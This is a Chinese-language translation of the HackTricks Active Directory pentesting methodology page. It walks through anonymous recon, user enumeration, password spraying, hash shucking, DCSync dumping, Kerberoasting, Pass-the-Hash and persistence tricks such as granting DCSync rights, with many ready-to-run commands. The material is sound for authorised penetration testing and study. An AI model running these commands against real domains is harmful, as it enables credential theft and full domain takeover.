# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，使 **network administrators** 能够高效地在网络中创建并管理 **domains**、**users** 和 **objects**。它被设计为可扩展的，便于将大量用户组织成可管理的 **groups** 和 **subgroups**，并在不同层级上控制 **access rights**。

**Active Directory** 的结构由三个主要层级组成：**domains**、**trees** 和 **forests**。一个 **domain** 包含一组对象（例如 **users** 或 **devices**），它们共享同一个数据库。**Trees** 是由这些 domain 按共享结构连接而成的组，而一个 **forest** 则表示多个 trees 的集合，通过 **trust relationships** 相互连接，形成组织结构的最上层。可以在这些层级的每一层指定特定的 **access** 和 **communication rights**。

Active Directory 的关键概念包括：

1. **Directory** – 存放与 Active Directory 对象相关的所有信息。
2. **Object** – 指目录中的实体，包括 **users**、**groups** 或 **shared folders** 等。
3. **Domain** – 作为目录对象的容器，多个 domains 可以共存于一个 **forest** 中，每个 domain 保持自己的对象集合。
4. **Tree** – 共享根域的一组 domains。
5. **Forest** – Active Directory 的组织结构顶层，由多个 trees 组成并存在 **trust relationships**。

**Active Directory Domain Services (AD DS)** 包含一系列对网络集中管理和通信至关重要的服务。这些服务包括：

1. **Domain Services** – 将数据存储集中化并管理 **users** 与 **domains** 之间的交互，包括 **authentication** 和 **search** 功能。
2. **Certificate Services** – 管理安全 **digital certificates** 的创建、分发与维护。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持启用目录的应用程序。
4. **Directory Federation Services** – 提供 **single-sign-on** 功能，使用户在单次会话内对多个 web 应用进行认证。
5. **Rights Management** – 通过调控未经授权的分发和使用，帮助保护受版权保护的内容。
6. **DNS Service** – 对 **domain names** 的解析至关重要。

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos 认证**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## 速查表

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

如果你只能访问 AD 环境但没有任何凭证/会话，你可以：

- **Pentest the network:**
- 扫描网络，发现主机和开放端口，尝试 **exploit vulnerabilities** 或从中 **extract credentials**（例如，[printers could be very interesting targets](ad-information-in-printers.md)）。
- 枚举 DNS 可以提供有关域内关键服务器的信息，如 web、printers、shares、vpn、media 等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用的 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 以获得有关如何执行这些操作的更多信息。
- **Check for null and Guest access on smb services**（这在现代 Windows 版本上通常不起作用）：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 有关如何枚举 SMB 服务器的更详细指南请参见：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 有关如何枚举 LDAP 的更详细指南请参见（请**特别注意匿名访问**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- 通过 [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 收集凭证
- 通过 [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 访问主机
- 通过 **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 收集凭证
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 从内部文档、社交媒体、服务（主要是 web）以及公开可获得的资源中提取用户名/姓名。
- 如果你找到了公司员工的全名，可以尝试不同的 AD **username conventions**（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的约定有：_NameSurname_、_Name.Surname_、_NamSur_（各取三字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个 _random letters and 3 random numbers_（例如 abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 用户枚举

- **Anonymous SMB/LDAP enum:** 请查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求一个 **invalid username** 时，服务器会使用 **Kerberos error** 代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 响应，从而让我们判定该用户名无效。**Valid usernames** 会在 AS-REP 中返回 **TGT**，或返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表明该用户需要执行预认证。
- **No Authentication against MS-NRPC**: 对域控制器上的 MS-NRPC (Netlogon) 接口使用 auth-level = 1（No authentication）。该方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，以在不提供任何凭据的情况下检查用户或计算机是否存在。该类型枚举由 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 工具实现。相关研究见 [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果在网络中发现了这些服务器之一，你还可以执行 **user enumeration against it**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### 知道一个或多个 usernames

好，所以你已经知道一个有效的 username 但没有 passwords…… 那么尝试：

- [**ASREPRoast**](asreproast.md): 如果某个用户 **没有** 属性 _DONT_REQ_PREAUTH_，你可以为该用户 **请求一个 AS_REP 报文**，其中会包含一些由该用户密码派生加密的数据。
- [**Password Spraying**](password-spraying.md): 对发现的所有 users 试用最常见的 passwords，也许有人在使用弱密码（注意 password policy！）。
- 注意你也可以 **对 OWA servers 进行 spraying**，尝试获取用户的 mail server 访问。

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你可能能通过中毒网络中的某些协议来**获取可破解的 challenge hashes**，比如：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

如果你已经能够枚举 Active Directory，你将获得**更多 emails 和对网络的更好理解**。你可能能够强制执行 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 来获取对 AD 环境的访问。

### Steal NTLM Creds

如果你可以使用 **null 或 guest user** 访问其他 PCs 或 shares，你可以 **放置文件**（如 SCF 文件），当这些文件被访问时会**触发对你的 NTLM 认证**，从而让你**窃取 NTLM challenge** 用于破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已经拥有的每个 NT hash 作为候选密码用于那些直接从 NT hash 派生密钥材料但破解速度较慢的格式。与其对 Kerberos RC4 tickets、NetNTLM challenges 或缓存凭证进行暴力破解，不如将 NT hashes 输入到 Hashcat 的 NT-candidate 模式，让它在不获取明文的情况下验证密码复用。这在域被攻破后尤其有效，因为你可以收集成千上万的当前和历史 NT hashes。

在以下情况下使用 shucking：

- 你有来自 DCSync、SAM/SECURITY dumps 或凭据保管库的 NT 语料库，需要测试在其他域/forest 中的复用情况。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`, `$krb5asrep$23$`）、NetNTLM 响应或 DCC/DCC2 blob。
- 你想快速证明对长且不可破解的口令的复用并立即通过 Pass-the-Hash pivot。

该技术**不适用于**密钥不是 NT hash 派生的加密类型（例如 Kerberos etype 17/18 AES）。如果一个域强制只使用 AES，则必须退回到常规的 password 模式。

#### Building an NT hash corpus

- **DCSync/NTDS** – 使用 `secretsdump.py` 并带 history 来抓取尽可能多的 NT hashes（及其历史值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目会大幅扩大候选池，因为 Microsoft 每个账户可存储多达 24 个以前的 hash。有关更多收集 NTDS secrets 的方法，请参见：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – 使用 `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz 的 `lsadump::sam /patch`）提取本地 SAM/SECURITY 数据和缓存的域登录（DCC/DCC2）。对这些 hashes 去重并追加到同一个 `nt_candidates.txt` 列表中。
- **记录元数据** – 保留产生每个 hash 的 username/domain（即使字典只包含十六进制）。一旦 Hashcat 打印出正确候选，匹配的 hash 会立即告诉你哪个主体在复用密码。
- 优先使用来自相同 forest 或受信任 forest 的候选；这会最大化 shucking 时的重合概率。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate 输入**必须保持原始 32-hex NT hashes**。禁用规则引擎（不要用 `-r`，不要用混合模式），因为 mangling 会破坏候选密钥材料。
- 这些模式本身并不更快，但 NTLM 的密钥空间（在 M3 Max 上约 30,000 MH/s）比 Kerberos RC4（约 300 MH/s）快约 100×。用一个策划好的 NT 列表测试远比在慢格式中探索整个密码空间便宜。
- 始终运行 **最新的 Hashcat 构建**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 是最近才发布的。
- 目前没有适用于 AS-REQ Pre-Auth 的 NT 模式，且 AES etypes（19600/19700）需要明文密码，因为它们的密钥是通过 PBKDF2 从 UTF-16LE 密码派生的，而不是原始 NT hashes。

#### Example – Kerberoast RC4 (mode 35300)

1. 使用低权限用户为目标 SPN 捕获一个 RC4 TGS（详情见 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 使用你的 NT 列表对 ticket 进行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 会从每个 NT candidate 导出 RC4 密钥并验证 `$krb5tgs$23$...` blob。匹配则证明该 service account 使用了你已有的某个 NT hash。

3. 立即通过 PtH pivot：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

如果需要，你可以随后用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文。

#### Example – Cached credentials (mode 31600)

1. 从被攻破的工作站转储缓存的登录：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣的域用户的 DCC2 行复制到 `dcc2_highpriv.txt` 并进行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功匹配会返回你列表中已知的 NT hash，证明该缓存用户在复用密码。可以直接用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`）或在快速 NTLM 模式下进行离线暴力以恢复字符串。

相同的工作流也适用于 NetNTLM challenge-responses（`-m 27000/27100`）和 DCC（`-m 31500`）。一旦识别出匹配，就可以发起 relay、SMB/WMI/WinRM PtH，或在离线使用 masks/rules 对 NT hash 重新破解。



## Enumerating Active Directory WITH credentials/session

在此阶段你需要**妥协了一个有效域账户的凭证或会话**。如果你拥有一些有效的凭证或作为域用户的 shell，**请记住之前提到的那些选项仍然可以用来妥协其他用户**。

在开始已认证的枚举之前，你应该了解 **Kerberos double hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 枚举

妥协一个账户是开始攻破整个域的**重要一步**，因为你将能够开始进行 **Active Directory Enumeration：**

关于 [**ASREPRoast**](asreproast.md) 你现在可以找到所有可能的易受影响用户；关于 [**Password Spraying**](password-spraying.md) 你可以获取**所有用户名的列表**并尝试用被妥协账户的密码、空密码或新的可行密码。

- 你可以使用 [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell for recon**](../basic-powershell-for-pentesters/index.html)，它会更隐蔽一些
- 你还可以 [**use powerview**](../basic-powershell-for-pentesters/powerview.md) 来提取更详细的信息
- 另一个对 Active Directory 进行 recon 的强大工具是 [**BloodHound**](bloodhound.md)。它根据你使用的收集方法**可能不太隐蔽**，但如果你不在意这一点，绝对值得一试。找出用户可以 RDP 的位置、找到通往其他组的路径等。
- **其他自动化的 AD 枚举工具有：** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**。**
- [**DNS records of the AD**](ad-dns-records.md)，它们可能包含有趣的信息。
- 一个可以用于枚举目录的 GUI 工具是来自 SysInternal 套件的 **AdExplorer.exe**。
- 你也可以使用 **ldapsearch** 在 LDAP 数据库中搜索字段 _userPassword_ & _unixUserPassword_，甚至 _Description_ 中的凭据。参见 PayloadsAllTheThings 上关于 AD 用户注释中密码的其他方法。
- 如果你使用 **Linux**，也可以用 [**pywerview**](https://github.com/the-useless-one/pywerview) 来枚举域。
- 你也可以尝试以下自动化工具：
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

从 Windows 很容易获取所有域用户名（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 上，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即便这一节看起来很短，这也是最重要的部分。访问这些链接（主要是 cmd、powershell、powerview 和 BloodHound），学习如何枚举域并反复练习直到熟练。在一次评估中，这将是找到通往 DA 的关键时刻，或者决定无路可走的判断点。

### Kerberoast

Kerberoasting 涉及获取与服务绑定的用户账户使用的 **TGS tickets**，并离线破解它们的加密——该加密基于用户密码。

更多内容见：


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

一旦你获取了某些凭证，可以检查是否能访问任何一台 **machine**。为此，你可以使用 **CrackMapExec** 根据端口扫描尝试用不同协议连接多台服务器。

### Local Privilege Escalation

如果你已经妥协了一个普通域用户的凭证或会话，并且以该用户身份**访问到域内的任何 machine**，你应尝试在本地升级权限并搜集凭据。只有在获得本地 administrator 权限后，你才能**转储其他用户**在内存（LSASS）或本地（SAM）中的 hashes。

本书中有一整页关于 [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) 和一个 [**checklist**](../checklist-windows-privilege-escalation.md)。另外，不要忘了使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### Current Session Tickets

在当前用户的会话中发现能够让你访问意外资源的 **tickets** 的可能性非常低，但你仍然可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

如果你已经成功枚举了 active directory，你会得到 **更多的邮箱信息并更好地理解网络状况**。你可能能够强制 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**。**

### Looks for Creds in Computer Shares | SMB Shares

既然你已经有了一些基本的 credentials，你应该检查是否能在 **AD 内找到任何被共享的有趣文件**。你可以手动检查，但那是一个非常无聊且重复的任务（如果你发现数百个需要检查的文档就更麻烦了）。

[**按照此链接了解你可以使用的工具。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

如果你可以 **访问其他 PC 或 shares**，你可以 **放置文件**（例如 SCF 文件），如果这些文件被访问，将会 **trigger an NTLM authentication against you**，这样你就可以 **steal** **NTLM challenge** 来破解它：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

此漏洞允许任何已认证的用户 **compromise the domain controller**。


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**对于下面的技术，仅有普通域用户权限是不够的，你需要一些特殊的 privileges/credentials 才能执行这些攻击。**

### Hash extraction

希望你已经通过 AsRepRoast、Password Spraying、Kerberoast、Responder（包括 relaying）、EvilSSDP、本地提权（escalating privileges locally）等方法成功**攻破了一些本地 admin**账户。\
接下来，是时候在内存和本地转储所有哈希了。\
[**阅读此页面了解获取哈希的不同方式。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**一旦你得到某个用户的 hash**，你就可以用它来**冒充**该用户。\
你需要使用某些 tool 来**使用该 hash 执行 NTLM 身份验证**，或者你可以创建一个新的 sessionlogon 并将该 hash 注入到 LSASS 中，这样当任何 NTLM 身份验证发生时，就会使用该 hash。最后一种方式正是 mimikatz 所做的。\
[**阅读此页面以获取更多信息。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在**使用用户的 NTLM hash 请求 Kerberos ticket**，作为常见的通过 NTLM 协议的 Pass The Hash 的替代方法。因此，这在禁用 NTLM 协议且仅允许 Kerberos 作为认证协议的网络中尤其**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者不是窃取用户的密码或哈希值，而是**窃取用户的认证票据**。然后使用该被窃取的票据**冒充该用户**，从而在网络内获得对资源和服务的未授权访问。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

如果你拥有某个 **local administrator** 的 **hash** 或 **password**，你应该尝试使用它**本地登录**到其他 **PC**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 注意这相当 **嘈杂**，且 **LAPS** 可以 **缓解**。

### MSSQL 滥用与受信任链接

如果用户有权限 **access MSSQL instances**，他可能能够利用它在 MSSQL 主机上 **execute commands**（如果以 SA 运行）、**steal** NetNTLM **hash** 或者甚至执行 **relay** **attack**。\
此外，如果一个 MSSQL 实例被另一个 MSSQL 实例信任（database link），并且该用户在受信任的数据库上有权限，他将能够 **use the trust relationship to execute queries also in the other instance**。这些信任可以串联，在某些情况下用户可能会找到一个被错误配置的数据库，在那里可以执行命令。\
**数据库之间的链接甚至可以跨越 forest trusts 工作。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 资产/部署平台 滥用

第三方的资产盘点和部署套件经常会暴露强大的凭证和代码执行路径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你发现任何 Computer 对象具有属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 并且你在该计算机上拥有域权限，你将能够从每个登录到该计算机的用户的内存中转储 TGTs。\
因此，如果 **Domain Admin logins onto the computer**，你将能够转储他的 TGT 并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
借助 constrained delegation，你甚至可以 **automatically compromise a Print Server**（希望它是 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许进行 "Constrained Delegation"，它将能够 **impersonate any user to access some services in a computer**。\
那么，如果你 **compromise the hash** of 该用户/计算机，你将能够 **impersonate any user**（甚至 domain admins）来访问某些服务。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

对远程计算机的 Active Directory 对象拥有 **WRITE** 权限，能够获得带有 **elevated privileges** 的代码执行：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs 滥用

被入侵的用户可能对某些域对象拥有一些 **interesting privileges**，这可能让你后续进行横向移动/或权限 **escalate**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler 服务 滥用

在域内发现 **Spool service listening** 可以被 **abused** 来 **acquire new credentials** 并 **escalate privileges**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 第三方会话 滥用

如果 **其他用户** **access** 被 **compromised** 的机器，就有可能 **gather credentials from memory** 甚至 **inject beacons in their processes** 以冒充他们。\
通常用户会通过 RDP 访问系统，下面是如何对第三方 RDP 会话执行几种攻击：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一种管理域成员计算机上 **local Administrator password** 的系统，确保其 **randomized**、唯一，并且定期 **changed**。这些密码存储在 Active Directory 中，并通过 ACL 控制仅允许授权用户访问。如果有足够的权限访问这些密码，就可能进行横向转移到其他计算机。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

从被入侵的机器 **gathering certificates** 可能是升级权限进入环境的一种方式：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates 滥用

如果配置了 **vulnerable templates**，可以滥用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 使用高权限账户的事后利用

### Dumping Domain Credentials

一旦你获得 **Domain Admin**，甚至更好的是 **Enterprise Admin** 权限，你可以 **dump** **domain database**：_ntds.dit_。

[**More information about DCSync attack can be found here**](dcsync.md)。

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc 作为 持久化

之前讨论的一些技术可以被用来做持久化。\
例如你可以：

- 使用户易受 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 使用户易受 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 授予用户 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 通过使用 **NTLM hash**（例如 **PC account** 的 hash）为特定服务创建一个合法的 Ticket Granting Service (TGS) ticket，以此来 **access the service privileges**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 涉及攻击者获取 Active Directory 环境中 **krbtgt account** 的 **NTLM hash**。这个账户是特殊的，因为它用于签名所有的 **Ticket Granting Tickets (TGTs)**，这些是 AD 网络内认证的关键。

一旦攻击者获得该 hash，就可以为任何他们选择的账户创建 **TGTs**（Silver ticket attack 的方法）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这些类似于 golden tickets，但以一种能够 **bypass common golden tickets detection mechanisms** 的方式伪造。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有账户的 certificates 或者能够请求它们** 是在用户账户中保持持久化的非常有效的方法（即使用户更改密码也依然有效）：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用 certificates 也可以在域内以高权限保持持久化：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder 组

Active Directory 中的 **AdminSDHolder** 对象通过在这些特权组（如 Domain Admins 和 Enterprise Admins）上应用标准的 **Access Control List (ACL)** 来确保安全，从而防止未经授权的更改。然而，该功能也可能被利用；如果攻击者修改 AdminSDHolder 的 ACL，赋予普通用户完全访问权限，该用户将获得对所有特权组的广泛控制权。这个本意用于保护的措施，若不仔细监控，可能反而导致未经授权的访问。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

在每个 **Domain Controller (DC)** 内部，都存在一个 **local administrator** 账户。通过获取此类机器的管理员权限，可以使用 **mimikatz** 提取本地 Administrator 的 hash。随后需要修改注册表以 **enable the use of this password**，从而允许远程访问本地 Administrator 账户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以对某些特定域对象 **give** 一些 **special permissions** 给某个 **user**，这将允许该用户在未来 **escalate privileges**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于 **store** 对象所具有的 **permissions**。如果你能在对象的 **security descriptor** 上做出一点小改动，你可以在不需要成为特权组成员的情况下，获得对该对象非常有趣的权限。


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

在内存中更改 **LSASS** 以建立一个 **universal password**，从而对所有域账户授予访问权限。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建你自己的 **SSP** 来 **capture** 以 **clear text** 访问机器时使用的 **credentials**。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它在 AD 中注册一个 **new Domain Controller** 并使用它来 **push attributes**（如 SIDHistory、SPNs...）到指定对象，且在 **modifications** 方面不会留下任何 **logs**。你需要 DA 权限并且位于 **root domain**。\
注意如果使用了错误的数据，会产生相当丑陋的日志。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前面我们讨论了如果你有 **enough permission to read LAPS passwords** 时如何提升权限。然而，这些密码也可以用于 **maintain persistence**。\
参见：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着 **compromising a single domain could potentially lead to the entire Forest being compromised**。

### 基本信息

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，使得来自一个 **domain** 的用户可以访问另一个 **domain** 的资源。它本质上在两个域的认证系统之间创建了一个链接，允许认证验证无缝流动。当域建立信任时，它们在各自的 **Domain Controllers (DCs)** 中交换并保留某些 **keys**，这些 keys 对信任的完整性至关重要。

在典型场景中，如果用户打算访问 **trusted domain** 中的服务，首先必须从自己的域的 DC 请求一个称为 **inter-realm TGT** 的特殊票证。这个 TGT 使用两个域之间达成的共享 **key** 加密。然后用户将该 TGT 提交给 **trusted domain** 的 **DC** 以获取服务票证（**TGS**）。在受信域的 DC 成功验证 inter-realm TGT 后，它会签发一个 TGS，从而授予用户对服务的访问权限。

**步骤**：

1. **Domain 1** 中的一个 **client computer** 使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)** 开始该过程。
2. 如果客户端认证成功，DC1 会发放一个新的 TGT。
3. 然后客户端向 DC1 请求一个 **inter-realm TGT**，这是访问 **Domain 2** 资源所必需的。
4. inter-realm TGT 使用 DC1 与 DC2 之间作为双向域信任的一部分共享的 **trust key** 加密。
5. 客户端将 inter-realm TGT 带到 **Domain 2 的 Domain Controller (DC2)**。
